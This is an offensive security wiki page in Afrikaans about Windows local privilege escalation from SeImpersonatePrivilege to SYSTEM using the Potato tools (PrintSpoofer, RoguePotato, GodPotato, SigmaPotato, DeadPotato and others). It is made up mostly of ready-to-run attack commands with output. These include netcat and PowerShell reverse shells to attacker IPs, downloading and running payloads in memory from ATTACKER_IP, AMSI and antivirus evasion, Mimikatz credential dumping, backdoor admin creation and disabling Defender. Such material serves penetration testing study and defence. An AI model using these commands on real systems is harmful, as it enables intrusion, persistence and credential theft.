# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato werk nie** op Windows Server 2019 en Windows 10 build 1809 en later nie. [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**, [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** en [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** kan egter gebruik word om **dieselfde privileges te benut en toegang op `NT AUTHORITY\SYSTEM`**-vlak te verkry. Hierdie [blogplasing](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) bespreek die `PrintSpoofer`-tool in diepte. Dit kan gebruik word om impersonation privileges op Windows 10- en Server 2019-hosts te misbruik waar JuicyPotato nie meer werk nie.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> ’n Moderne alternatief wat gereeld in 2024–2025 onderhou word, is SigmaPotato (’n fork van GodPotato), wat in-memory/.NET reflection-gebruik en uitgebreide OS-ondersteuning byvoeg. Sien die vinnige gebruik hieronder en die repo in References.

Verwante bladsye vir agtergrond en manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Vereistes en algemene slaggate

Al die volgende techniques maak staat op die misbruik van ’n privileged service wat impersonation kan uitvoer, vanuit ’n konteks wat een van hierdie privileges bevat:

- SeImpersonatePrivilege (mees algemeen) of SeAssignPrimaryTokenPrivilege
- Hoë integriteit word nie vereis indien die token reeds SeImpersonatePrivilege het nie (tipies vir baie service accounts soos IIS AppPool, MSSQL, ens.)

Kontroleer privileges vinnig:
```cmd
whoami /priv | findstr /i impersonate
```
Operasionele notas:

- As jou shell onder ’n beperkte token loop wat nie SeImpersonatePrivilege het nie (algemeen vir Local Service/Network Service in sommige kontekste), herwin die rekening se verstekvoorregte met FullPowers, en voer dan ’n Potato uit. Voorbeeld: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer benodig dat die Print Spooler-diens loop en bereikbaar is oor die plaaslike RPC-endpoint (spoolss). In geharde omgewings waar Spooler ná PrintNightmare gedeaktiveer is, verkies RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato benodig ’n OXID-resolver wat op TCP/135 bereikbaar is. As egress geblokkeer is, gebruik ’n redirector/poort-aanstuurder (sien die voorbeeld hieronder). Ouer builds het die -f-vlag benodig.
- EfsPotato/SharpEfsPotato misbruik MS-EFSR; as een pipe geblokkeer is, probeer alternatiewe pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fout 0x6d3 tydens RpcBindingSetAuthInfo dui gewoonlik op ’n onbekende/nie-ondersteunde RPC-authentication service; probeer ’n ander pipe/transport of verseker dat die teikendiens loop.
- “Kitchen-sink”-forks soos DeadPotato bundel ekstra payload-modules (Mimikatz/SharpHound/Defender off) wat na disk skryf; verwag hoër EDR-detection in vergelyking met die slanker oorspronklikes.

## Vinnige demonstrasie

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notas:
- Jy kan `-i` gebruik om ’n interaktiewe proses in die huidige konsole te begin, of `-c` om ’n eenlyn-opdrag uit te voer.
- Vereis die Spooler-diens. As dit gedeaktiveer is, sal dit misluk.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
As uitgaande 135 geblokkeer word, pivot die OXID resolver via socat op jou redirector:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato is ’n nuwer COM abuse primitive wat laat in 2022 vrygestel is en die **PrintNotify**-diens teiken in plaas van Spooler/BITS. Die binary instansieer die PrintNotify COM-server, vervang die `IUnknown` met ’n fake een, en aktiveer dan ’n bevoorregte callback deur `CreatePointerMoniker`. Wanneer die PrintNotify-diens (wat as **SYSTEM** loop) terugkoppel, dupliseer die proses die teruggestuurde token en begin dit die verskafde payload met volledige privileges.<sup>[[13]](#references)</sup>

Belangrike operasionele notas:

* Werk op Windows 10/11 en Windows Server 2012–2022 solank die Print Workflow/PrintNotify-diens geïnstalleer is (dit is teenwoordig selfs wanneer die legacy Spooler ná PrintNightmare gedeaktiveer is).
* Vereis dat die calling context oor `SeImpersonatePrivilege` beskik (tipies vir IIS APPPOOL-, MSSQL- en scheduled-task service accounts).
* Aanvaar óf ’n direkte command óf ’n interactive mode sodat jy binne die oorspronklike console kan bly. Voorbeeld:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Omdat dit suiwer COM-gebaseer is, word geen named-pipe listeners of external redirectors vereis nie, wat dit ’n drop-in replacement maak op hosts waar Defender RoguePotato se RPC binding blokkeer.

Operators soos Ink Dragon loods PrintNotifyPotato onmiddellik nadat hulle ViewState RCE op SharePoint verkry het om van die `w3wp.exe` worker na SYSTEM te pivot voordat ShadowPad geïnstalleer word.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Wenk: As een pipe misluk of EDR dit blokkeer, probeer die ander ondersteunde pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notas:
- Werk oor Windows 8/8.1–11 en Server 2012–2022 wanneer SeImpersonatePrivilege teenwoordig is.
- Kry die binary wat by die geïnstalleerde runtime pas (bv. `GodPotato-NET4.exe` op moderne Server 2022).
- Indien jou aanvanklike execution primitive ’n webshell/UI met kort timeouts is, stage die payload as ’n script en vra GodPotato om dit eerder as ’n lang inline command uit te voer.<sup>[[12]](#references)</sup>

Vinnige staging-patroon vanaf ’n skryfbare IIS-webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato bied twee variante wat diens-DCOM-objekte teiken wat standaard op RPC_C_IMP_LEVEL_IMPERSONATE ingestel is. Bou of gebruik die verskafde binaries en voer jou command uit:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato voeg moderne geriewe by, soos in-memory execution via .NET reflection en ’n PowerShell reverse shell-hulpmiddel.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Bykomende voordele in 2024–2025 builds (v1.2.x):
- Ingeboude reverse shell-vlag `--revshell` en verwydering van die 1024-karakter PowerShell-limiet, sodat jy lang AMSI-bypassing-payloads in een keer kan uitvoer.
- Reflection-vriendelike sintaksis (`[SigmaPotato]::Main()`), plus ’n rudimentêre AV-evasion-truuk via `VirtualAllocExNuma()` om eenvoudige heuristiek te mislei.
- Afsonderlike `SigmaPotatoCore.exe`, saamgestel teen .NET 2.0 vir PowerShell Core-omgewings.

### DeadPotato (2024 GodPotato-herwerking met modules)

DeadPotato behou die GodPotato OXID/DCOM-impersonation-ketting, maar bou post-exploitation-hulpmiddels in sodat operators onmiddellik SYSTEM kan verkry en persistence/collection kan uitvoer sonder bykomende tooling.<sup>[[15]](#references)</sup>

Algemene modules (almal vereis SeImpersonatePrivilege):

- `-cmd "<cmd>"` — begin ’n arbitrêre command as SYSTEM.
- `-rev <ip:port>` — vinnige reverse shell.
- `-newadmin user:pass` — skep ’n plaaslike admin vir persistence.
- `-mimi sam|lsa|all` — drop en voer Mimikatz uit om credentials te dump (skryf na skyf en is opvallend).
- `-sharphound` — voer SharpHound-collection as SYSTEM uit.
- `-defender off` — skakel Defender se intydse beskerming af (baie opvallend).

Voorbeelde van eenreël-opdragte:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Omdat dit ekstra binaries saamstuur, verwag meer AV/EDR-vlaggies; gebruik die skraler GodPotato/SigmaPotato wanneer stealth belangrik is.

## Verwysings

- [1] [PrintSpoofer – Abusing Impersonation Privileges on Windows 10 and Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [No more JuicyPotato? Old story, welcome RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
